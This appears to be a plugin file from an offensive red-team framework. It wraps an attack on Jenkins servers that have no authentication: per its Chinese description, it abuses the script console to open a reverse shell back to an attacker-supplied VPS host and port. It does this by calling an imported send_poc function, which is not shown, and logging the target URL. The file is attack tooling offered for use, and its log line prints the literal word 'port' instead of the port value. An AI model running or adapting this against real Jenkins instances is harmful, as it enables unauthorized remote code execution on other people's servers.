from plugins.lib.jenkins.main import send_poc
from plugins.plugin import Plugin
from urllib.parse import urlparse


class RTPlugin(Plugin):
    def __init__(self):
        super().__init__()
        self.name = "jenkins_unauthorized"
        self.type = self.URL_SHELL
        self.desc = "jenkins在系统管理->脚本命令行中，可以运行java，如Jenkins未开启账号认证。则可利用该功能进行反弹shell"

    def _run(self):
        _ = self.vps.split(":")
        host = _[0]
        port = _[1]
        self.log(f"攻击URL：{self.url},vps host:{host} 端口：port")
        content = send_poc(self.url, host, port)
        print(content.decode("utf-8"))

